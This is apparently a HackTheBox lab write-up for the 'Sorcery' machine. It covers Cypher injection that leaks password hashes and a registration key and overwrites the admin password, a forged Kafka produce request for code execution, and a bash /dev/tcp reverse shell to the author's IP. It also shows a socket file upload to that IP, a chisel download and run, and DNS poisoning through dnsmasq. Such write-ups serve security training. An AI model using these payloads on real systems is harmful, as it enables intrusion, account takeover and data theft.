# Sorcery

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.73:22
Open 10.10.11.73:443
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.73

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBfa7NkcG06jauyQoChLbmUKvvd6pkaufyqxTH7Lc0LeTfUmDv2PZsCeNM0mm6JytOdhIhsLONllRYME0Fizhjw=
|   256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPzwgWWL8qvTI4EzWXUX7/aGWcm8W4pTGnFiqfVbeOeh
443/tcp open  ssl/http syn-ack nginx 1.27.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=sorcery.htb
| Issuer: commonName=Sorcery Root CA
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-31T02:09:11
| Not valid after:  2052-03-18T02:09:11
| MD5:   c294:7d7a:2965:5c32:3dc9:b850:e2e5:0d9a
| SHA-1: 9d44:6d3d:5fb6:252c:da8b:3dd1:b5a2:aeb3:1e4b:5534
| -----BEGIN CERTIFICATE-----
| MIIEuTCCAqECFFDAAPGK7ud2DPpuM8BMaxLfK0U+MA0GCSqGSIb3DQEBCwUAMBox
| GDAWBgNVBAMMD1NvcmNlcnkgUm9vdCBDQTAgFw0yNDEwMzEwMjA5MTFaGA8yMDUy
| MDMxODAyMDkxMVowFjEUMBIGA1UEAwwLc29yY2VyeS5odGIwggIiMA0GCSqGSIb3
| DQEBAQUAA4ICDwAwggIKAoICAQCzJ67yuLHya53/zQsksQ67gOY0gNWc+OcVKmf6
| I8dwbMHLuBYRNckTwvrRgi6C+qSQlsJxzRqaAdmgVQphhSEC5yBsPJZlzXHVw4iZ
| 6rznhlhyAFFJTcZelj/Si2HDwG5VFE1FNRlPwSCk1JXAZGhDpJZhlyq+/3uA2DdF
| zdh+0VrWzbWwzNf551De5xRtWPfU5Bogn1qcuenCV2RmZqqGCYj0BP+I8E+AqccH
| gicLQCG7d9G5pY6y3PrI/fUslqA0QEdw5XthrZSOiAxBTOcqEW9uA4hssOsUTd3H
| benGAlApswSGy8wWEsKzu3AnvERMCUr+kel0wX/y4rSpMFYLc5YY5A262Lgwc2Ib
| XR5C8nFaGhcLwYtUiwf6HRo52rm18eu1lFNfHW0Wy6ay6K3jxgUfpDziIgZyGacZ
| PM7Yrmqnpe4ovrVawlytIu2bupNYVPtZAktSFhtZHrhjbQz5qDrAEySdhMDfBfD4
| jtBj5EbtPWNrphQsk3N0fN+xuZfIq3xDn8UEiZ/HqsYXFse1f0R3Cl7kpO3aVFX+
| Md4qKNM0wsrIMCywYP3ZmUYeX8NcHsgYNWILunX5qYBYHCY1J+sIu00ctPxfRDmU
| ve+ppb6GQYFPuXpGzr0GEQHQDpPIBG46QzYYnGa8PgYJeFgj7Pt96lcOXnlgiZoE
| Lrl4qwIDAQABMA0GCSqGSIb3DQEBCwUAA4ICAQAzOj7t4yHHEI6Pn+FMyci/WFUi
| bQKq8QytZPb9n0oaU5WoECexuEsw9JeIUoMLbllB31bnbqJrdr2FdC3qBKJKlzM5
| MoJ+BdBMhhIO+q/AElc8y2kWxyqeuceLiEpt0FL3kN6y44eyqKSjb9hdIIAPqTB5
| 7AXCxLR7eP7zjBDPP5HVuEAvizmXyCTF4/6SnvyAse3SF5G2cKWr+yNqtZOkW0Us
| +3zoj/qP0pnHjZLR+OpQ9716Ls1Q1jvTB/RoUKuSTogDuhXJ1CYMhcQx9wkJcgZm
| lh5qAMh2eooxT6x9Ddyro45Z7u+rT3H9y6OcF5pWHlxQAj1hz6sw1mZqYN7gGwl6
| esChPBXQtH0cedj3e/2LDyvibMiY4ayRQo/ht98Q0qeyyTsms6DjphCbsdK6iDOQ
| g2ea6tdwmgEAvJggRcBhypBT6XGIjC6bP6cFy60NeMZUGvA673p18eYjTc3VFlpc
| FnInaCC2L9Dz8fn6iDWjlrPLcGDbIVLmsafFHd6oG9jor8ghNcPLQrSokJnZwkJM
| oWu6ErucUC/r9FPcDaWXBI9CzpwzRbYHo/L2nXikRS8MExI3yZWP5dsxFuALVZE4
| oGVdkAuuUVt+lOZ7ik8OWLxQKENAYAv88apzmWuHlM/j+/v9lygzauLtPhVhbpse
| 4PPnLBiUeFv9xmOPvw==
|_-----END CERTIFICATE-----
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Did not follow redirect to https://sorcery.htb/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.27.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTPs

No HTTP, directly to HTTP**s**

![Writeup.png](/assets/pentest/htb/sorcery/Writeup.png)

Register and test application (without Registration Key):

![Writeup-5.png](/assets/pentest/htb/sorcery/Writeup-5.png)

![Writeup-3.png](/assets/pentest/htb/sorcery/Writeup-3.png)

In **Profile** we can **Enroll passkey**, but it seems to be disabled for **Clients**

![Writeup-4.png](/assets/pentest/htb/sorcery/Writeup-4.png)

We have access to their git repository at https://git.sorcery.htb/nicole_sullivan/infrastructure

There's 1 Issue which doesn't seem to be fixed, possible attack vector.

![Writeup-1.png](/assets/pentest/htb/sorcery/Writeup-1.png)

### Source Backend

Git clone
```bash
â””â”€$ GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
```

#### Phishing Training

Potential username: `tom_summers`. There was also some mentions about using `bot` (via Chromium), combined with Phishing Training Post we can deduct that there's a service which checks for Phishing urls.

![Writeup-2.png](/assets/pentest/htb/sorcery/Writeup-2.png)

#### Auth

Authentication in this project is handled in theÂ [backendÂ crate, primarily inÂ [auth.rsÂ and related modules. TheÂ [backend-macrosÂ crate is not directly involved in authenticationâ€”it provides a procedural macro ([Model) for database models.

1.Â **User Login**
	- **Endpoint:**Â `/api/auth/login`
	- **Process:**
	    - User submits username and password.
	    - The backend fetches the user by username from the database.
	    - Password is verified using Argon2 hashing.
	    - If valid, a JWT (JSON Web Token) is created with user info and privilege level.
	    - The JWT is sent back and also set as a cookie.
2.Â **User Registration**
	- **Endpoint:**Â `/api/auth/register`
	- **Process:**
	    - User submits username, password, and optionally a registration key.
	    - Username is validated (alphanumeric).
	    - Password is hashed with Argon2.
	    - If the registration key matches the expected value, the user is given a higher privilege (**Seller**); otherwise, they are aÂ **Client**.
	    - User is saved to the database.
3.Â **JWT-Based Authentication**
	- **JWT Secret:**Â Randomly generated at startup (`connection.rs`)
	- **Claims:**Â JWT contains user ID, username, privilege level, and other flags.
	- **Verification:**Â On each request, the JWT is extracted from theÂ `Authorization`Â header or cookie, decoded, and validated.
4.Â **Privilege Enforcement**
	- **Guards:**Â Custom request guards (`RequireAuthentication`,Â `RequireAdmin`, `RequireSeller`, Â `RequireClient`, `RequirePasskey`) check the user's privilege level and flags before allowing access to endpoints.
	- **Example:**Â Only users withÂ [AdminÂ privilege can access certain routes.
5.Â **Passkey/WebAuthn Support**
	- For some endpoints, additional authentication via passkey (WebAuthn) is required (`RequirePasskey`).

![Writeup-6.png](/assets/pentest/htb/sorcery/Writeup-6.png)

#### Database

Backend-macros:
- TheÂ **Model**Â derive macro inÂ **backend-macros** is used for database models (e.g.,Â User, Product, Post)
- It generates methods for saving, fetching, and querying models from the database.
- It doesÂ **not**Â handle authentication logic.

TL;DR: Authentication is JWT-based, with password hashing and privilege checks. The macros crate only helps with database model code generation, not authentication.

The application has following services running:

![Writeup-8.png](/assets/pentest/htb/sorcery/Writeup-8.png)

neo4j is the only logical database that's being used, and there's no mention of SQLite3. However I struggled to find any vulnerable queries. `get_functions` seems to have a custom query, but it's not used anywhere.

![Writeup-7.png](/assets/pentest/htb/sorcery/Writeup-7.png)

The `lib.rs`Â file inÂ **backend-macros**Â defines a procedural macro calledÂ **Model** that automatically generates database methods for structs.

When you addÂ `#[derive(Model)]`Â to a struct, the macro generates several methods for that struct:

1. **`get_by_<field>()`Â methods**  
    For each field, it generates a method likeÂ `get_by_id`,Â `get_by_username`, etc.
    - These methods build a Cypher query string usingÂ [format!Â to match a node by the field value.
    - They execute the query and, if a result is found, construct the struct from the database row.
2. **save() method**
    - This method creates a CypherÂ `CREATE`Â query string for the struct.
    - It uses parameterized queries for the field values (withÂ `.param()`), which helps prevent injection for the values.
    - It runs the query in a transaction and commits it.
3. **get_all()Â method**
    - This method fetches all nodes of the structâ€™s type from the database.
    - It maps each result row to an instance of the struct.
4. **from_row()Â method**
    - This helper constructs the struct from a database row, extracting each field.

| Method       | Query Construction | Injection Risk?           |
| ------------ | ------------------ | ------------------------- |
| get_by_field | `format!`          | **Yes**Â (field value)     |
| save         | `.param()`         | No (values parameterized) |
| get_all      | `format!`          | No (no user input)        |
| from_row     | N/A                | No                        |

The macro generates database methods for structs, automating common CRUD operations. Most methods are safe, but theÂ `get_by_<field>()`Â methods use string interpolation for field values, which can be unsafe if those values come from user input. TheÂ `save()`Â method uses parameterized queries for values, which is safe.

### Source DNS

For reason I don't understand, the DNS service has an RCE...

- TheÂ `main()` function listens for messages on a Kafka topic.
- Each message is treated as a shell command and executed withÂ `bash -c <command>`.
- After running the command, it reads DNS entries from a file and sends them as JSON to another Kafka topic.

![Writeup-9.png](/assets/pentest/htb/sorcery/Writeup-9.png)

Something like `/dns/convert.sh` is passed to Kafka and later executed. However the endpoint is protected route, we need to be admin and have a passkey.

![Writeup-10.png](/assets/pentest/htb/sorcery/Writeup-10.png)

## Cipher Injection

e.g.: `get_one` method in products is vulnerable to Cipher injection

![Writeup-11.png](/assets/pentest/htb/sorcery/Writeup-11.png)

If we add `"` (quote) to product id, query fails and server responds with `HTTP/1.1 500 Internal Server Error` meaning something broke.

![Writeup-12.png](/assets/pentest/htb/sorcery/Writeup-12.png)

Something like following is a valid Neo4j injection, hence the results are returned.
```
/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f" }) RETURN result AS result //

https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f"%20})%20RETURN%20result%20AS%20result%20%2f%2f
```

![Writeup-13.png](/assets/pentest/htb/sorcery/Writeup-13.png)

> **Note**: Make sure to URL encode all chars, and especially `//` with `%2F%2F` since we want slashes in query, not path.

```python
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests import Session
from urllib.parse import quote
import readline

URL = 'https://sorcery.htb'
USERNAME, PASSWORD = 'test02', 'test02'
KEY = ''

def login(session, username, password):
    resp = session.post(f'{URL}/auth/login', data=f'["{username}","{password}"]', headers={'Next-Action': '7abc1d84ff816e8d6965b2132e8011685a8c9917'})
    if 'token' not in resp.text:
        raise Exception("Login failed")

    return resp.text.split('\n')[1][22:-3]

def register(session, username, password, key):
    resp = session.post(f'{URL}/auth/register', data=f'["{username}","{password}","{key}"]', headers={'Next-Action': 'cc5a75671722b7fa3634cb7cc01d2022f9d19e5b'})
    if 'error' in resp.text:
        if 'Username already exists' in resp.text:
            return ''
        raise Exception("Register failed")

    return resp.text.split('\n')[1][2:]

def output_to_json(output):
    result = ""
    for line in output.split('\n'):
        start = line.find('[')
        if start == -1:
            start2 = line.find('{')
            if start2 != -1 and (start == -1 or start2 < start):
                start = start2

        if start == -1: 
            continue

        line = line[start:].strip()
        while True: # Error based correction...
            try:
                result += json.dumps(json.loads(line), indent=2)
                break
            except json.JSONDecodeError as e:
                line = line[:e.pos - 1] + line[e.pos + 1:]
                
    return result

with Session() as session:
    session.proxies = { 'https': 'http://127.0.0.1:8080' }
    session.verify = False 
    
    register(session, USERNAME, PASSWORD, KEY)
    token = login(session, USERNAME, PASSWORD)
    
    session.cookies.set('token', token)
    
    while True:
        injection = quote(input(f'Injection: '), safe='')
        resp = session.get(f'{URL}/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f{injection}', headers={'Rsc': '1'})
        print(output_to_json(resp.text))
        print(resp.url)
```

> Docs: [https://neo4j.com/docs/cypher-cheat-sheet/25/all/](https://neo4j.com/docs/cypher-cheat-sheet/25/all/)

### Leak User Hash

Following injection was valid, however no data was returned...
```bash
Injection: "}) MATCH (u:User) RETURN result //"

https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28u%3AUser%29%20RETURN%20result%20%2F%2F
```

However if we specify the object and rewrite the return values with User object we can leak the values. 
```bash
Injection: "}) MATCH (u:User) RETURN result { .*, name: u.username, description: u.password } //"
...
"children": "admin"
...
"__html": "$$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E"

https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28u%3AUser%29%20RETURN%20result%20%7B%20.%2A%2C%20name%3A%20u.username%2C%20description%3A%20u.password%20%7D%20%2F%2F
```

However we probably are not cracking a random password with argon2 encryption method. On the other hand we can leak Registration Key and elevate ourself to other privileges.
```rust
#[derive(Deserialize, Model)]
struct Config {
    is_initialized: bool,
    registration_key: String,
}
```

### Leak Registration Key

```bash
Injection: "}) MATCH (c: Config) RETURN result { .*, description: c.registration_key } //"
...
"__html": "dd05d743-b560-45dc-9a09-43ab18c7a513"
...
https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28c%3A%20Config%29%20RETURN%20result%20%7B%20.%2A%2C%20description%3A%20c.registration_key%20%7D%20%2F%2F
```

Registration Key allows us to register as Seller, but all we can do is publish new products. Not very useful unless we can do phishing maybe?

![Writeup-14.png](/assets/pentest/htb/sorcery/Writeup-14.png)

### Change Password

Argon hash has following format: 
```perl
$argon2id$v=<version>$m=<memory>,t=<iterations>,p=<parallelism>$<salt_b64>$<hash_b64>
```

| Parameter       | Value                    | Meaning                     |
| --------------- | ------------------------ | --------------------------- |
| **Algorithm**   | argon2id                 | Recommended secure variant  |
| **Version**     | 0x13 (19)                | Current stable version      |
| **Memory**      | 19456 KB                 | 19 MB                       |
| **Iterations**  | 2                        | How many passes over memory |
| **Parallelism** | 1                        | Single thread               |
| **Salt**        | `59N03nQg/o5cMqnl4RphWQ` | 128-bit random salt         |
| **Hash**        | `BR9QBMUy...`            | The password digest output  |

In Cypher you can have SET statement inside your SELECT query; This could mean we can hijack passwords.

![Writeup-15.png](/assets/pentest/htb/sorcery/Writeup-15.png)

Generate the hash with `argon2id` encryption, [https://argon2.online](https://argon2.online)

![Writeup-16.png](/assets/pentest/htb/sorcery/Writeup-16.png)

First I tested it on my user, you can do WHERE with `{username: 'test03'}`. Logging out and then back in lets you in with new password! Do the same for admin.
```bash
Injection: "}) MATCH (u:User {username: 'test03'}) SET u.password="$argon2id$v=19$m=19456,t=2,p=1$OGlUeXNSb3hlZjhZUDNRQw$C5ZhUR1hSZQM44xQcU/oB6k8DDeKlYqrDqtjqeCDzck" RETURN result { .*, name: u.username, description: u.password } //"

https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28u%3AUser%20%7Busername%3A%20%27test03%27%7D%29%20SET%20u.password%3D%22%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%24OGlUeXNSb3hlZjhZUDNRQw%24C5ZhUR1hSZQM44xQcU%2FoB6k8DDeKlYqrDqtjqeCDzck%22%20RETURN%20result%20%7B%20.%2A%2C%20name%3A%20u.username%2C%20description%3A%20u.password%20%7D%20%2F%2F

----

Injection: "}) MATCH (u:User {username: 'admin'}) SET u.password="$argon2id$v=19$m=19456,t=2,p=1$OGlUeXNSb3hlZjhZUDNRQw$C5ZhUR1hSZQM44xQcU/oB6k8DDeKlYqrDqtjqeCDzck" RETURN result { .*, name: u.username, description: u.password } //"

https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20MATCH%20%28u%3AUser%20%7Busername%3A%20%27admin%27%7D%29%20SET%20u.password%3D%22%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%24OGlUeXNSb3hlZjhZUDNRQw%24C5ZhUR1hSZQM44xQcU%2FoB6k8DDeKlYqrDqtjqeCDzck%22%20RETURN%20result%20%7B%20.%2A%2C%20name%3A%20u.username%2C%20description%3A%20u.password%20%7D%20%2F%2F
```

> **Note**: In case of 404 error during login make sure you log out, [https://sorcery.htb/auth/logout](https://sorcery.htb/auth/logout)

## Passkey

We are admin, however we lack the Passkey and cannot use any admin features...

![Writeup-17.png](/assets/pentest/htb/sorcery/Writeup-17.png)

Theory:
- [https://webauthn.passwordless.id/faq/](https://webauthn.passwordless.id/faq/)
- [https://webauthn.passwordless.id/concepts/](https://webauthn.passwordless.id/concepts/)

So turns out you just need to add the Passkey. Chrome Webtools provides a virtual tool for this. 
1. `Settings > Developer Settings > 3 dots > WebAuthn`
2. `Add new authenticator (I used defaults and checked all)`
3. `Profile > Enroll Passkey`
4. Logout
5. Login with **Passkey ID**
6. We now have access to all the admin routes.

![Writeup-18.png](/assets/pentest/htb/sorcery/Writeup-18.png)

## Kafka

The `debug` route allows us to send raw TCP data to anywhere, this allows us to access internal services and interact with them.

We want to attack Kafka, because it sends commands to DNS service; But API sends hardcoded value `/dns/convert.sh` which is a script to update DNS records. We need to overwrite contents or find another way to get control of `value`.

![Writeup-19.png](/assets/pentest/htb/sorcery/Writeup-19.png)

If we go back to DNS Source the service is inside an infinite loop, and whenever it get's new command (value) from Kafka it executes it and that's out way in~

Research:
1. [Kafka in 100 Seconds](https://youtu.be/uvb00oaa3k8)
2. [https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/](https://ivanyu.me/blog/2024/09/08/kafka-protocol-practical-guide/)
3. [kafka-protocol-practical-guide](https://github.com/ivanyu/kafka-protocol-practical-guide) snippets
4. [kio](https://github.com/Aiven-Open/kio): Python data types for the Apache KafkaÂ® Protocol.

Because we can talk to internal services via Debug we can forge a Kafka Produce Request, send it to Kafka itself and get RCE.

```python
# Code roughly genratedby Claude4~
import argparse, struct, zlib

class ProduceRequest:
    def __init__(self, topic, message, client_id="python-client", partition=0, correlation_id=1):
        self.topic = topic
        self.message = message
        self.client_id = client_id
        self.partition = partition
        self.correlation_id = correlation_id
    
    def _pack_string(self, s):
        """Pack string: length (2 bytes) + utf8 bytes"""
        if s is None: return struct.pack('>h', -1)
        return struct.pack('>h', len(s)) + s.encode('utf-8')
    
    def _pack_bytes(self, data):
        """Pack bytes: length (4 bytes) + data"""
        if data is None: return struct.pack('>i', -1)
        return struct.pack('>i', len(data)) + (data if isinstance(data, bytes) else data.encode('utf-8'))
    
    def build_header(self):
        """Build request header: api_key, api_version, correlation_id, client_id"""
        header = b''
        header += struct.pack('>h', 0)      # api_key = 0 (Produce)
        header += struct.pack('>h', 0)      # api_version = 0 (simplest)
        header += struct.pack('>i', self.correlation_id)
        header += self._pack_string(self.client_id)
        return header
    
    def build_topic(self):
        """Build topic data: topic_name + partition_data"""
        topic_data = b''
        topic_data += self._pack_string(self.topic)  # topic name
        topic_data += struct.pack('>i', 1)           # partition count = 1
        topic_data += struct.pack('>i', self.partition)  # partition id
        return topic_data
    
    def build_message(self):
        """Build message set with single message"""
        # Message content
        msg_data = b''
        msg_data += struct.pack('>i', 0)         # crc32 (placeholder)
        msg_data += struct.pack('>b', 0)         # magic byte
        msg_data += struct.pack('>b', 0)         # attributes
        msg_data += self._pack_bytes(None)       # key = null
        msg_data += self._pack_bytes(self.message)  # value
        
        # Calculate CRC32 (skip first 4 bytes which are crc itself)
        crc = zlib.crc32(msg_data[4:]) & 0xffffffff
        
        # Rebuild with correct CRC
        msg_data = b''
        msg_data += struct.pack('>I', crc)       # crc32
        msg_data += struct.pack('>b', 0)         # magic byte  
        msg_data += struct.pack('>b', 0)         # attributes
        msg_data += self._pack_bytes(None)       # key = null
        msg_data += self._pack_bytes(self.message)  # value
        
        # Message set: offset + message_size + message
        message_set = b''
        message_set += struct.pack('>q', 0)      # offset = 0
        message_set += struct.pack('>i', len(msg_data))  # message size
        message_set += msg_data
        
        return message_set
    
    def build(self):
        """Build complete ProduceRequest"""
        header = self.build_header()
        
        # ProduceRequest body
        body = b''
        body += struct.pack('>h', 1)         # required_acks = 1
        body += struct.pack('>i', 10000)     # timeout = 10s
        body += struct.pack('>i', 1)         # topic count = 1
        
        # Topic data
        topic_part = self.build_topic()
        message_set = self.build_message()
        
        body += topic_part
        body += struct.pack('>i', len(message_set))  # message_set_size
        body += message_set
        
        # Complete request = header + body
        request = header + body
        
        # Add request size prefix
        return struct.pack('>i', len(request)) + request
    
    def to_hex(self):   return self.build().hex()
    def to_bytes(self): return self.build()

def verbobytes(data):
    return''.join(c if c.isprintable() and c.isascii() else '.' for c in data.decode(errors='replace'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple Kafka ProduceRequest generator')
    parser.add_argument('-t', '--topic', required=True, help='Topic name')
    parser.add_argument('-m', '--message', required=True, help='Message content')
    parser.add_argument('-p', '--partition', type=int, default=0, help='Partition (default: 0)')
    parser.add_argument('--client-id', default='kafka-client', help='Client ID')
    parser.add_argument('--correlation-id', type=int, default=1, help='Correlation ID')
    parser.add_argument('-f', '--format', choices=['hex', 'dump'], default='hex', help='Output format')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show request info')

    args = parser.parse_args()
    request = ProduceRequest(topic=args.topic, message=args.message, client_id=args.client_id, partition=args.partition, correlation_id=args.correlation_id)

    if args.verbose:
        print(f"Topic: {args.topic}")
        print(f"Partition: {args.partition}")
        print(f"Message: {args.message}")
        print(f"Client ID: {args.client_id}")
        print(f"Size: {len(request.to_bytes())} bytes")
        print(f'{"- " * 40}\n{verbobytes(request.to_bytes())}\n{"- " * 40}')

    args.format = args.format.lower().strip()
    if args.format == 'hex':
        print(f"Hex payload:\n{request.to_hex()}")
    elif args.format == 'dump':
        with open('kafka_produce_request.bin', 'wb') as f:
            f.write(request.to_bytes())
    else:
        print(f"Unsupported format: {args.format}")
```

### Reverse Shell

```bash
â””â”€$ py rce.py -t update -m "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.39/4444 0>&1'"
Hex payload:
0000008b0000000000000001000c6b61666b612d636c69656e7400010000271000000001000675706461746500000001000000000000005700000000000000000000004b53b7d5b80000ffffffff0000003d2f62696e2f62617368202d6320272f62696e2f62617368202d69203e26202f6465762f7463702f31302e31302e31342e33392f3434343420303e263127
```

![Writeup-20.png](/assets/pentest/htb/sorcery/Writeup-20.png)

> **Note**: Use `kafka` as host, because that's how docker-compose is configured to identify service.

```bash
(remote) user@7bfb70ee5b9c:/tmp$ getent hosts backend frontend neo4j kafka dns mail ftp gitea mail_bot nginx | sort -t '.' -k 4 -n
172.19.0.2      nginx
172.19.0.3      gitea
172.19.0.4      dns
172.19.0.5      backend
172.19.0.6      neo4j
172.19.0.7      mail_bot
172.19.0.8      kafka
172.19.0.9      ftp
172.19.0.10     mail
172.19.0.11     frontend
```

## DNS Poisoning

1. We are inside the production infrastructure
2. We have control of dns
3. DNS service constantly writes `git.sorcery.htb` bijilion times
4. There's ongoing phishing campaign
5. Developers are using Gitea for development

If we can manage to make DNS resolve to our server instead of theirs then we could possible leak credentials of some users (like tom). 
```bash
# Upgraded to pwncat-cs
(remote) user@7bfb70ee5b9c:/app$ find /app /dns -type f -ls
    33974   1144 -rwxr-xr-x   1 root     root      1167088 Oct 30  2024 /app/dns
   655019      4 -rw-r--r--   1 root     root          624 Jul 22 04:03 /dns/hosts
   656719      0 -rwxr--r--   1 user     user            0 Oct 31  2024 /dns/entries
   655368      4 -rwxr-xr-x   1 root     root          364 Aug 31  2024 /dns/convert.sh
(remote) user@7bfb70ee5b9c:/app$ uniq /dns/hosts
127.0.0.1 git.sorcery.htb
(remote) user@7bfb70ee5b9c:/app$ wc -l /dns/hosts
24 /dns/hosts
```

This is just a Rust binary for DNS service, no hardcoded credentials or secrets should be stored inside since we have source code which is using Env (nothing in **user** env too).
```bash
â””â”€$ nc -lvnp 4444 > dns.bin
---
(remote) user@7bfb70ee5b9c:/app$ python3 -c "import socket; s = socket.socket(); s.connect(('10.10.14.39', 4444)); s.sendall(open('/app/dns', 'rb').read()); s.close()"
---
â””â”€$ file dns.bin
dns.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=696b266b795f17414a0afb318c1bd923a7c52bdf, for GNU/Linux 3.2.0, not stripped
```

Most linux commands are nowhere to be found, but we still can use Python. 

The dns management service is called `dnsmasq`, from `convert.sh` we know it reads few files, one of which is `/dns/hosts-user` (which we have WRITE access to). Inject new domain to dns names, restart the service for dns to update.
```bash
(remote) user@7bfb70ee5b9c:/dns$ echo '10.10.14.39 letmein.sorcery.htb' > /dns/hosts-user
(remote) user@7bfb70ee5b9c:/dns$ /dns/convert.sh
(remote) user@7bfb70ee5b9c:/dns$ uniq entries
127.0.0.1 git.sorcery.htb
10.10.14.39 letmein.sorcery.htb
(remote) user@7bfb70ee5b9c:/dns$ pkill dnsmasq
(remote) user@7bfb70ee5b9c:/dns$ /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts &
[2] 631
dnsmasq: started, version 2.89 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 127.0.0.11#53
dnsmasq: read /etc/hosts - 9 names
dnsmasq: read /dns/hosts - 24 names
dnsmasq: read /dns/hosts-user - 1 names
(remote) user@7bfb70ee5b9c:/dns$ dig letmein.sorcery.htb @127.0.0.1 | grep -vE ';|^$'
letmein.sorcery.htb.    0       IN      A       10.10.14.39
```

Since we are inside the network
A. We can use Python to explore the network
B. Setup reverse proxy

```bash
(remote) user@7bfb70ee5b9c:/tmp$ python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.39/chisel', '/tmp/chisel')"
(remote) user@7bfb70ee5b9c:/tmp$ chmod +x /tmp/chisel
(remote) user@7bfb70ee5b9c:/tmp$ /tmp/chisel client 10.10.14.39:36000 R:socks &
```

### FTP

There's anonymous access enabled on FTP (See compose).
```bash
â””â”€$ proxychains -q ftp anonymous@ftp
Connected to ftp.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
ftp> cd pub
ftp> get RootCA.crt
ftp> get RootCA.key
ftp> exit
```

```bash
â””â”€$ openssl x509 -in RootCA.crt -noout -text | grep -v ':..:'
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Sorcery Root CA
        Validity
        Subject: CN=Sorcery Root CA
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
            X509v3 Authority Key Identifier:
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:

â””â”€$ openssl rsa -in RootCA.key -noout -text
Enter pass phrase for RootCA.key:
Could not find private key from RootCA.key
40576A33B97F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:
40576A33B97F0000:error:11800074:PKCS12 routines:PKCS12_pbe_crypt_ex:pkcs12 cipherfinal error:../crypto/pkcs12/p12_decr.c:92:empty password
```

The following hash didn't crack
```bash
â””â”€$ pem2john RootCA.key | tee key.hash
$PEM$1$4$e08de23b5667e579$2048$dc64a012052b346d6a4b68d1c08a56ce$2384$c28fedfaf2ea1ae2ddc892c811726bd8625369da0b6200ff000d21e86cc546d74e3e316bb4ac1d14ef05deaeb9edf99094868a340bcd7857ceaa1aa4170fd64d29b79bd7a8adfb1162cfb9b9006778d9c39e90f39278ecf77e55bd791e5fd6e704b56804bf20fd35ac756638c233fb42b8f66f63ab5609ccae31b7c435dd8c7f3bc8f0639003d6bce7831f4aeb1d351f7225260a4cd38442d633364c08787401491bc1fa2ed329e6b28dabd8433a4daca9c27051dbf343b799cbc6a96c4c991eb68cdd70da54cf68fe48ec609845858ba6fd481c30ea014ccddb1a8751a95b4ffd599bce2b94e9e73a7317e8490baf87ccaae8fd1e794bc307cf1669367df8769c7ede34cdeb8e6cb1443b3db4d38c995e3b0876edec1d42b5e6cb07d7220f652709ec3e5c24dc3ec212863576c8caad618e9852ede1291a6ec07c9472d4c7815e829efcd9a9da5c07fe496ac6ac7c1ec55eb48e8055e4416991f2ea8ed227fcb49d3bdda7d8d709c3c29d219b4c6d0343f0ef451b89024dc5d1b2115c2ffb488764a7b0d0127f34efd2b48494d2ce81ff1112e986cdd93c5cd029f9ab1ad5ce9a165d6b9a32f56545627716041b72cd0ab76976db6d5488cb3c28010f8b8fcb58ad94184436022384e7fc66182683420641f86326e0e87ea2056d533ee8d60c27ee6375facef1d4afd58d9296c5b862722b935a96977f6b2708666c9f68fe60e71